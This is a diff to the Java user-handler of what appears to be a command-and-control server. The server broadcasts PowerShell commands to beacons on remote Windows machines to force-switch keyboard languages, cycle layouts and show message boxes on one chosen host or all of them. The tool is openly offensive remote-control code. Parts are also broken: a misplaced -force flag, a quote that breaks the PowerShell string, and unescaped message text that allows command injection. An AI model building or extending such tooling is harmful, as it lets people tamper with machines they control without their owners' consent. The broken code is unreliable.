@@ -7,6 +7,8 @@ import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.Scanner;
 import java.util.Queue;
+import java.util.HashSet;
+import java.util.Arrays;
 
 public class C2ServerUserHandler implements Runnable{
     private String RED = "\u001B[31m";
@@ -313,16 +315,24 @@ public class C2ServerUserHandler implements Runnable{
                 System.out.println("1. THE GOOSE");
                 System.out.println("2. Change Keyboard Language [EASY]");
                 System.out.println("3. Change Keybaord Layout [HARD]");
-                System.out.println("4. Send Message Box");
-                System.out.println("5. Back");
+                System.out.println("4. Change Keybaord Layout to English");
+                System.out.println("5. Send Message Box");
+                System.out.println("6. Back");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
+                
+                HashSet<String> validInputs = new HashSet<>(Arrays.asList("1","2","3","4","5"));
+                if(validInputs.contains(userInput)){
+                    System.out.println("Enter IP address of target, 'Windows','Linux', or 'All");
+                    System.out.print(" >> ");
+                    String target = userInputScanner.nextLine();
+                }
+                System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
+                String target = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     // TODO: Figure out how to launch the goose.
                 } else if (userInput.equals("2")){
-                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
-                    String target = userInputScanner.nextLine();
                     // Set their Keybaord language to French for 60 seconds, then change it back to English
                     String commands = "";
                     commands += "Set-WinUserLanguageList fr-FR -force;";
@@ -333,8 +343,6 @@ public class C2ServerUserHandler implements Runnable{
                     commands += "Set-WinUserLanguageList en-US; -force";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("3")){
-                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
-                    String target = userInputScanner.nextLine();
                     // Change their Keybaord language every 30 seconds
                     HashMap<String, String> languages = new HashMap<>();
                     String commands = "";
@@ -350,11 +358,16 @@ public class C2ServerUserHandler implements Runnable{
                         commands += "Start-Sleep -Seconds 30;";
                     }
                     commands += "[System.Windows.MessageBox]::Show('Ok you can have English Again');";
-                    commands += "Set-WinUserLanguageList en-US;";
+                    commands += "Set-WinUserLanguageList en-US -force;";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
                 } else if (userInput.equals("4")){
-                    System.out.println("Enter IP address of individual target, or 'All' for all clients: ");
-                    String target = userInputScanner.nextLine();
+                    // Change it back to english in case we mess up
+                    String commands = "";
+                    commands += "Set-WinUserLanguageList en-US; -force;";
+                    commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
+                    commands += "[System.Windows.MessageBox]::Show('Sorry about that here's english')";
+                    C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
+                } else if (userInput.equals("5")){
                     // Send a message box
                     String commands = "";
                     commands += "Add-Type -assemblyName PresentationCore, PresentationFramework;";
@@ -362,7 +375,7 @@ public class C2ServerUserHandler implements Runnable{
                     String message = userInputScanner.nextLine();
                     commands += "[System.Windows.MessageBox]::Show('"+ message+ "');";
                     C2server.broadcastToBeacons("Command Windows " + target + "_" + commands);
-                }else if (userInput.equals("5")){
+                }else if (userInput.equals("6")){
                     currentUserPath = "";
                 } else {
                     System.out.println("Invalid Input");
